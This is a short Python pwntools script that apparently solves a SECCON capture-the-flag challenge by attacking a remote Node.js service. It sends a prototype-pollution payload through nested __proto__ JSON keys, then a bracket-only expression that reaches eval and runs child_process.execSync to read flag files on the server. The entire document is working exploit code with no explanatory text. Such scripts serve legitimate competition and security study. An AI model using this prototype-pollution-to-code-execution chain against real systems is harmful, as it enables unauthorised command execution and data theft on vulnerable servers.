import json

from pwn import *

payload = "global.process.mainModule.constructor._load('child_process').execSync('cat /flag*.txt').toString()"

j = {
	"__proto__": {
		"": {
			"": "flat",
			"flat": {
				"": "constructor",
				"flat": {
					"": "return eval",
					"flat": payload,
				},
			},
		},
	}
}
s = remote("pp4.seccon.games", 5000)
s.sendlineafter(b":", json.dumps(j).encode())

level1 = "[][[]]"
flat_s = f"{level1}[[]]"
level2 = f"[][[]][{flat_s}]"
cons_s = f"{level2}[[]]"
level3 = f"{level2}[{flat_s}]"
eval_s = f"{level3}[[]]"
payload_s = f"{level3}[{flat_s}]"
s.sendlineafter(b":", f"[][{flat_s}][{cons_s}]({eval_s})()({payload_s})".encode())
print(s.recvall().decode())
